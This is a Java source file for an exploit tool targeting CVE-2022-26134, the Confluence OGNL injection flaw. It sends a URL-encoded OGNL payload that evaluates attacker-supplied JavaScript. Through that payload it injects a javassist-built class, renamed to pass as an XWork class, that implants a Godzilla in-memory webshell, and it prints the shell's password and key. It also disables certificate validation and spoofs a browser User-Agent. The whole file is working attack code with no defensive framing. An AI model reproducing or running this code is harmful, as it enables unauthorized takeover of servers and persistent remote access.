package main;

import com.sun.org.apache.bcel.internal.generic.FADD;
import javassist.ClassPool;
import javassist.CtClass;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.Base64;
import java.util.UUID;

public class Main {
    public static void main(String[] args) throws Throwable{
        if (args.length < 3) {
            System.out.println("java -jar CVE-2022-26134.jar http://127.0.0.1:8090/ pass key");
            return;
        }

        String url = args[0];
        String password = args[1];
        String key = args[2];

        System.out.println("[*] url: " + url);

        MiTM.trustAllHttpsCertificates();

        String payload = "%24%7B%23a%3Dnew%20javax.script.ScriptEngineManager().getEngineByName(%22js%22).eval(%40com.opensymphony.webwork.ServletActionContext%40getRequest().getParameter(%22search%22)).(%40com.opensymphony.webwork.ServletActionContext%40getResponse().setHeader(%22X-Status%22%2C%22ok%22))%7D/";
        if (!url.endsWith("/")){
            payload = "/" + payload;
        }
        url = url + payload;

        HttpURLConnection urlConnection = (HttpURLConnection) new URL(url).openConnection();
        urlConnection.setInstanceFollowRedirects(false);
        urlConnection.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
        urlConnection.setRequestProperty("User-Agent","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36");
        urlConnection.setDoOutput(true);
        urlConnection.setDoInput(true);
        OutputStream outputStream = urlConnection.getOutputStream();


        CtClass ctClass = ClassPool.getDefault().get("main.MemShell");
        ctClass.makeClassInitializer().insertBefore(String.format("password = \"%s\";\n" +
                "     key = \"%s\";\n",password,md5(key).substring(0, 16).toLowerCase()));
        ctClass.setName("com.opensymphony.xwork." + UUID.randomUUID().toString().replace("-", ""));
        String js = new String(readInputStream(Main.class.getResourceAsStream("1.js")));
        js = js.replace("{payload}", Base64.getEncoder().encodeToString(ctClass.toBytecode()));
        js = js.replace("{className}",ctClass.getName());

        String content = "search=" + URLEncoder.encode(js);
        outputStream.write(content.getBytes());
        outputStream.flush();
        outputStream.close();

        System.out.println("[*] send payload");
        if ( "ok".equals(urlConnection.getHeaderField("X-Status"))){
            System.out.println("[*] exploit success");
            System.out.println("[*] godzilla webshell password : " + password);
            System.out.println("[*] godzilla webshell key : " + key);
        }else {
            System.out.println("[*] exploit fail");
        }
    }

    public static byte[] readInputStream(InputStream inputStream) {
        byte[] temp = new byte[4096];
        int readOneNum = 0;
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            while ((readOneNum = inputStream.read(temp)) != -1) {
                bos.write(temp, 0, readOneNum);
            }
            inputStream.close();
        }catch (Exception e){
        }
        return bos.toByteArray();
    }
    public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; }

}
